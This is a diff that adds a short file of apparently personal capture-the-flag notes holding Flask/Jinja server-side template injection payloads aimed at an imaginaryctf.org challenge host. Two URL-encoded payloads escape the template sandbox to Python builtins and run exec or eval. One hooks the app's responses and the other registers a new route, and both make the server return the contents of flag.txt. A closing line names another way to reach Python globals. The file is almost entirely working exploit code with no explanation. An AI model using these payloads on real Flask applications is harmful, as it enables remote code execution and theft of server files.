@@ -1,0 +1,6 @@
+http://puzzler7.imaginaryctf.org:5555/ssti?input={{g.pop.__globals__.__builtins__.exec(request.args.code)}}&code=import%20sys;app=sys._getframe(6).f_globals[%27app%27];print(app);app.after_request((lambda%20app:%20(lambda%20x:%20app.make_response(open(%22flag.txt%22,%20%27r%27).read().strip())))(app))
+
+http://puzzler7.imaginaryctf.org:5555/ssti?input={{r.__init__.__globals__.__builtins__.eval("__import__('flask').current_app.add_url_rule('/endpoint',endpoint='unique',view_func=lambda:open('flag.txt', 'r').read().strip())")}}
+
+other ways to get globals:
+request.application.__globals__
